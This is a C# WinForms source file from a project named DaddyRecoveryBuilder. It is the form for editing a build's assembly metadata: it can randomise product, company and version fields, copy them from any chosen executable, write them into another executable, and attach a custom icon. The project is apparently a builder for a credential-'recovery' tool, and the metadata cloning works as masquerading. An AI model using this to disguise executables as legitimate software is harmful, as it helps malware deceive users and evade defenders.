namespace DaddyRecoveryBuilder.ExForms
{
    using System;
    using System.Diagnostics;
    using System.Drawing;
    using System.IO;
    using System.Windows.Forms;
    using Helpers;
    using Properties;

    public partial class AssFrm : UserControl
    {
        private void TextBoxOnTextChanged(object sender, KeyPressEventArgs e)
        {
            char number = e.KeyChar;
            if (!char.IsDigit(number) && number != 8 && number != 46)
            {
                e.Handled = true;
            }
        }

        public AssFrm()
        {
            InitializeComponent();
            ProdVerBox.KeyPress += new KeyPressEventHandler(TextBoxOnTextChanged);
            FileVerBox.KeyPress += new KeyPressEventHandler(TextBoxOnTextChanged);
            IcoViewer.AllowDrop = true;
            DragEnter += new DragEventHandler(IcoViewer_DragEnter);
            DragDrop += new DragEventHandler(IcoViewer_DragDrop);
        }

        private void GenAssButton_Click(object sender, EventArgs e)
        {
            ActiveControl = null;
            ProductBox.Text = GenTools.GetUpdate();
            DescriptBox.Text = GenTools.GetUpdate();
            CompanyBox.Text = GenTools.GetUpdate();
            CopyrightBox.Text = GenTools.GetUpdate();
            TrademarksBox.Text = GenTools.GetUpdate();
            InternalBox.Text = GenTools.GetUpdate();
            OriginalBox.Text = GenTools.GetUpdate();

            ProdVerBox.Text = Convert.ToString($"{GenTools.Next(10)}.{GenTools.Next(10)}.{GenTools.Next(10)}.{GenTools.Next(10)}");
            FileVerBox.Text = Convert.ToString($"{GenTools.Next(10)}.{GenTools.Next(10)}.{GenTools.Next(10)}.{GenTools.Next(10)}");
        }

        private void RndAssButton_Click(object sender, EventArgs e)
        {
            ActiveControl = null;
            ProductBox.Text = GenTools.GenerateIdentifier(15);
            DescriptBox.Text = GenTools.GenerateIdentifier(15);
            CompanyBox.Text = GenTools.GenerateIdentifier(15);
            CopyrightBox.Text = GenTools.GenerateIdentifier(15);
            TrademarksBox.Text = GenTools.GenerateIdentifier(15);
            InternalBox.Text = GenTools.GenerateIdentifier(15);
            OriginalBox.Text = GenTools.GenerateIdentifier(15);

            ProdVerBox.Text = Convert.ToString($"{GenTools.Next(10)}.{GenTools.Next(10)}.{GenTools.Next(10)}.{GenTools.Next(10)}");
            FileVerBox.Text = Convert.ToString($"{GenTools.Next(10)}.{GenTools.Next(10)}.{GenTools.Next(10)}.{GenTools.Next(10)}");
        }

        private void CloneDataButton_Click(object sender, EventArgs e)
        {
            ActiveControl = null;

            using var openFileDialog = new OpenFileDialog
            {
                Title = "[AssemblyInfo Editor] - Select the file from which you want to receive data",
                Filter = "Executable (*.exe)|*.exe",
                AutoUpgradeEnabled = true,
                CheckFileExists = true,
                Multiselect = false,
                RestoreDirectory = true
            };
            if (openFileDialog.ShowDialog() == DialogResult.OK)
            {
                var fileVersionInfo = FileVersionInfo.GetVersionInfo(openFileDialog.FileName);

                InternalBox.Text = fileVersionInfo.InternalName ?? string.Empty;
                DescriptBox.Text = fileVersionInfo.FileDescription ?? string.Empty;
                CompanyBox.Text = fileVersionInfo.CompanyName ?? string.Empty;
                ProductBox.Text = fileVersionInfo.ProductName ?? string.Empty;
                CopyrightBox.Text = fileVersionInfo.LegalCopyright ?? string.Empty;
                TrademarksBox.Text = fileVersionInfo.LegalTrademarks ?? string.Empty;
                FileVerBox.Text = $"{fileVersionInfo.FileMajorPart}.{fileVersionInfo.FileMinorPart}.{fileVersionInfo.FileBuildPart}.{fileVersionInfo.FilePrivatePart}";
                ProdVerBox.Text = $"{fileVersionInfo.FileMajorPart}.{fileVersionInfo.FileMinorPart}.{fileVersionInfo.FileBuildPart}.{fileVersionInfo.FilePrivatePart}";
            }
        }

        private void ActiveBoxBuild_CheckedChanged(object sender, EventArgs e)
        {
            ToDicData.Visible = ActiveBoxBuild.Checked;
        }

        private void OtherAppChangeBox_CheckedChanged(object sender, EventArgs e)
        {
            ActiveControl = null;

            if (OtherAppChangeBox.Checked)
            {
                EditAssAppOther.Visible = true;
                PathToFileText.Visible = true;
                FilePathBox.Visible = true;
                AppChoice.Visible = true;
            }
            else
            {
                EditAssAppOther.Visible = false;
                PathToFileText.Visible = false;
                FilePathBox.Visible = false;
                AppChoice.Visible = false;
            }
        }

        private void IconBox_CheckedChanged(object sender, EventArgs e)
        {
            if (IconBox.Checked)
            {
                DragIcoText.Visible = true;
                IcoViewer.Visible = true;
            }
            else
            {
                DragIcoText.Visible = false;
                IcoViewer.Visible = false;
                LsizeIco.Text = "";
                LsizeIco.Visible = false;
                IcoViewer.Image = Resources.drag_and_drop_icon;
            }
        }

        private void ToDicData_Click(object sender, EventArgs e)
        {
            // Сделать проверку на пустые боксы

            Collector.AddToDic("Product", ProductBox.Text);
            Collector.AddToDic("Decription", DescriptBox.Text);
            Collector.AddToDic("Company", CompanyBox.Text);
            Collector.AddToDic("Copyright", CopyrightBox.Text);
            Collector.AddToDic("Trademask", TrademarksBox.Text);
            Collector.AddToDic("Internal", InternalBox.Text);
            Collector.AddToDic("Original", OriginalBox.Text);
            Collector.AddToDic("ProdVersion", ProdVerBox.Text);
            Collector.AddToDic("FileVersion", FileVerBox.Text);

            BuildSettings.Icon_Build = IconBox.Checked;
            BuildSettings.Assembly_Build = ActiveBoxBuild.Checked;
            BuildSettings.Pictures_Build = IcoViewer.ImageLocation; // Путь до иконки
            MusicPlay.Inizialize(Resources.Click);
            ControlActive.ShowTextAsync(MessageData, "Data added success", Color.FromArgb(120, 5, 179), 5000);
        }

        private void AssFrm_Load(object sender, EventArgs e)
        {
            NativeMethods.SendMessage(ProductBox.Handle, NativeMethods.EM_SETCUEBANNER, 0, "Имя продукта");
            NativeMethods.SendMessage(DescriptBox.Handle, NativeMethods.EM_SETCUEBANNER, 0, "Заголовок файла");
            NativeMethods.SendMessage(CompanyBox.Handle, NativeMethods.EM_SETCUEBANNER, 0, "Имя компании продукта");
            NativeMethods.SendMessage(CopyrightBox.Handle, NativeMethods.EM_SETCUEBANNER, 0, "Авторское право");
            NativeMethods.SendMessage(TrademarksBox.Handle, NativeMethods.EM_SETCUEBANNER, 0, "Товарный знак");
            NativeMethods.SendMessage(InternalBox.Handle, NativeMethods.EM_SETCUEBANNER, 0, "Внутреннее имя файла");
            NativeMethods.SendMessage(OriginalBox.Handle, NativeMethods.EM_SETCUEBANNER, 0, "Оригинальное имя файла");
        }

        private void EditAssAppOther_Click(object sender, EventArgs e)
        {
            var data = new AssemblyCollector
            {
                ProductInfo = ProductBox.Text,
                FileDescriptInfo = DescriptBox.Text,
                CompanyNameInfo = CompanyBox.Text,
                LegalCopyrightInfo = CopyrightBox.Text,
                LegalTrademarksInfo = TrademarksBox.Text,
                InternalNameInfo = InternalBox.Text,
                OriginalFilenameInfo = OriginalBox.Text,
                ProductVersionInfo = ProdVerBox.Text,
                FileVersionInfo = FileVerBox.Text
            };

            AssTools.WriteAssembly(FilePathBox.Text, data);
            ControlActive.ShowTextAsync(MessageProperties, "File properties changed successfully!", Color.Yellow, 5000);
        }

        private void FilePathBox_TextChanged(object sender, EventArgs e)
        {
            if (FilePathBox.Text.Equals(GlobalPaths.ExeFullPath, StringComparison.OrdinalIgnoreCase))
            {
                FilePathBox.Clear();
            }
        }

        private void IcoViewer_Click(object sender, EventArgs e)
        {
            using var Open = new OpenFileDialog
            {
                Title = "Choice icon for Build",
                Filter = "Icon (*.ico)|*.ico",
                Multiselect = false,
                AutoUpgradeEnabled = true,
                CheckFileExists = true,
                RestoreDirectory = true
            };

            if (Open.ShowDialog() == DialogResult.OK)
            {
                IcoViewer.ImageLocation = Open.FileName;
                DragIcoText.Visible = false;
                LsizeIco.Visible = true;
                LsizeIco.Text = $"Size Ico: {GetFileSize.Inizialize(new FileInfo(Open.FileName).Length)}";
            }
            else
            {
                LsizeIco.Text = "";
                LsizeIco.Visible = false;
                IcoViewer.Image = Resources.drag_and_drop_icon;
                DragIcoText.Visible = true;
            }
        }

        private void AppChoice_Click(object sender, EventArgs e)
        {
            using var filedi = new OpenFileDialog
            {
                Title = "[AssemblyInfo Editor] - Select the file you want to change the data",
                Filter = "Executable File (*.exe)|*.exe",
                AutoUpgradeEnabled = true,
                CheckFileExists = true,
                Multiselect = false,
                RestoreDirectory = true
            };
            if (filedi.ShowDialog() == DialogResult.OK)
            {
                FilePathBox.Text = filedi.FileName;
            }
        }

        private void IcoViewer_DragEnter(object sender, DragEventArgs e)
        {
            if (e.Data.GetDataPresent(DataFormats.FileDrop, false) == true)
            {
                e.Effect = DragDropEffects.Move;
            }
        }

        private void IcoViewer_DragDrop(object sender, DragEventArgs e)
        {
            string[] files = (string[])e.Data.GetData(DataFormats.FileDrop);
            if (files[0].EndsWith(".ico"))
            {
                IcoViewer.ImageLocation = files[0];
                DragIcoText.Visible = false;
                LsizeIco.Visible = true;
                LsizeIco.Text = $"Size Ico: {GetFileSize.Inizialize(new FileInfo(files[0]).Length)}";
            }
            else
            {
                DragIcoText.Visible = true;
                LsizeIco.Text = "";
                LsizeIco.Visible = false;
            }
        }
    }
}
